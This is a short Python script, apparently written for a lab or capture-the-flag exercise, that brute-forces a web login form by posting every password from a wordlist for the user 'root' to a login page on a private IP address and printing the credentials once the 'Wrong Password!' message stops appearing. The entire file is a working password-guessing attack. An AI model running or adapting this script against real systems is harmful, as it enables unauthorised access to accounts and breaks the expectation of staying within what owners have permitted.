import requests
import random

adminName = "root"
passwordList = "passwords.txt"
requestURL = 'http://192.168.59.192/login'

with open(passwordList, 'r') as f:
    names = [name.strip() for name in f.readlines() if name.strip()]

random.shuffle(names)

wrong = True
while wrong:
    for name in names:
        print("Trying username {} with password {}".format(adminName, name))
        r = requests.post(requestURL, data={"username":adminName, "password":name})
        if "<p class=is-warning>Wrong Password!</p>" not in r.text and 'Error processing request' not in r.text:
            wrong = False
            break

print("Found credentials: Username {} with password {}".format(adminName, name))
